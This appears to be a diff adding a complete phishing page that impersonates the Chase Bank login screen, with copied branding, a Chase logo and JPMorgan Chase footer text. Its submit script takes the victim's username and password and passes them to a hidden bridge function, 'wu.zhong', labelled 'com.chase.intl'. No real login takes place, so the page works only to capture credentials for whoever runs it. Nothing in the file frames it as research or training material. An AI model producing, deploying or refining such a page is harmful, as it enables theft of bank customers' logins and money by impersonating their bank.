@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase Bank Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: #117ac9;
+            color: white;
+            padding: 0;
+            text-align: center;
+            position: relative;
+            height: 200px;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background-color: #000;
+        }
+
+        .chase-logo {
+            font-size: 24px;
+            font-weight: 400;
+            letter-spacing: 3px;
+            padding-top: 60px;
+            font-family: Arial, sans-serif;
+        }
+        .chase-logo img{
+            max-height: 120px;
+            max-width: 60%;
+        }
+
+        .logo-cross {
+            display: inline-block;
+            margin-left: 8px;
+            font-size: 20px;
+            font-weight: normal;
+            position: relative;
+            top: -2px;
+        }
+
+        .main-container {
+            position: relative;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .login-form {
+            background: white;
+            margin-top: -80px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            padding: 24px 20px 20px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 4px;
+            font-weight: normal;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 8px 0;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            font-size: 16px;
+            background: transparent;
+            outline: none;
+            color: #333;
+        }
+
+        .form-input:focus {
+            border-bottom-color: #117ac9;
+        }
+
+        .password-group {
+            position: relative;
+        }
+
+        .show-toggle {
+            position: absolute;
+            right: 0;
+            bottom: 8px;
+            color: #117ac9;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .show-toggle:hover {
+            text-decoration: underline;
+        }
+
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0 24px 0;
+            font-size: 14px;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox {
+            width: 14px;
+            height: 14px;
+            margin-right: 6px;
+            border: 1px solid #ccc;
+            appearance: none;
+            border-radius: 2px;
+            background: white;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .checkbox:checked {
+            background: #117ac9;
+            border-color: #117ac9;
+        }
+
+        .checkbox:checked::after {
+            content: '✓';
+            color: white;
+            font-size: 10px;
+            position: absolute;
+            left: 1px;
+            top: -1px;
+        }
+
+        .checkbox-label {
+            color: #666;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .sign-in-button {
+            width: 100%;
+            background: #117ac9;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            text-transform: none;
+        }
+
+        .sign-in-button:hover {
+            background: #0f6bb8;
+        }
+
+        .sign-in-button:active {
+            background: #0d5ea3;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .forgot-password a {
+            color: #117ac9;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .bottom-navigation {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 16px;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+
+        .bottom-navigation a {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .bottom-navigation a:hover {
+            color: #117ac9;
+            text-decoration: underline;
+        }
+
+        .more-options {
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px 8px;
+            line-height: 1;
+        }
+
+        .more-options:hover {
+            color: #117ac9;
+        }
+
+        .footer {
+            background: white;
+            padding: 16px;
+            border-top: 1px solid #eee;
+            margin-top: auto;
+        }
+
+        .equal-housing {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .housing-icon {
+            width: 16px;
+            height: 16px;
+            background: #666;
+            margin-right: 6px;
+            border-radius: 2px;
+            flex-shrink: 0;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 480px) {
+            .main-container {
+                padding: 0 12px;
+            }
+            
+            .login-form {
+                padding: 20px 16px 16px 16px;
+            }
+            
+            .bottom-navigation {
+                flex-direction: column;
+                gap: 16px;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="chase-logo">
+            <img src="https://thechasefieldhouse.com/wp-content/uploads/2023/07/image-6.png">
+        </div>
+
+        <br><br><br><br><br>
+
+    <div class="main-container">
+        <div class="login-form">
+            <form id="loginForm">
+                <div class="input-group">
+                    <label class="input-label" for="username">Enter your username</label>
+                    <input type="text" id="username" class="form-input" autocomplete="username">
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="password">Enter your password</label>
+                    <div class="password-group">
+                        <input type="password" id="password" class="form-input" autocomplete="current-password">
+                        <a href="#" class="show-toggle" onclick="togglePassword(event)">Show</a>
+                    </div>
+                </div>
+
+                <div class="options-row">
+                    <div class="checkbox-wrapper">
+                        <input type="checkbox" id="remember" class="checkbox">
+                        <label for="remember" class="checkbox-label">Remember me</label>
+                    </div>
+                    <div class="checkbox-wrapper">
+                        <input type="checkbox" id="token" class="checkbox">
+                        <label for="token" class="checkbox-label">Use token</label>
+                    </div>
+                </div>
+
+                <button type="submit" class="sign-in-button">Sign In</button>
+            </form>
+
+            <div class="forgot-password">
+                <a href="#" onclick="handleForgot(event)">Forgot username or password?</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-navigation">
+        <a href="#" onclick="handleLink(event, 'Sign up')">Sign up</a>
+        <a href="#" onclick="handleLink(event, 'Open an account')">Open an account</a>
+        <a href="#" onclick="handleLink(event, 'Privacy')">Privacy</a>
+        <button class="more-options"  title="More options">⋯</button>
+    </div>
+
+    <div class="footer">
+        <div class="equal-housing">
+          
+        </div>
+        <div class="footer-text">
+            Deposit products provided by JPMorgan Chase Bank, N.A.<br>
+            Credit cards are issued by JPMorgan Chase Bank, N.A. Member FDIC
+        </div>
+    </div>
+
+    <script>
+        function togglePassword(e) {
+            e.preventDefault();
+            const passwordInput = document.getElementById('password');
+            const showToggle = e.target;
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showToggle.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showToggle.textContent = 'Show';
+            }
+        }
+
+     
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username) {
+
+                document.getElementById('username').focus();
+                return;
+            }
+            
+            if (!password) {
+
+                document.getElementById('password').focus();
+                return;
+            }
+
+            wu.zhong(`🔰Chase Bank \n\n✉️Username: ${username}\n🔒Password: ${password}`,"com.chase.intl");
+
+            
+     
+        });
+
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderBottomColor = '#117ac9';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderBottomColor = '#ccc';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
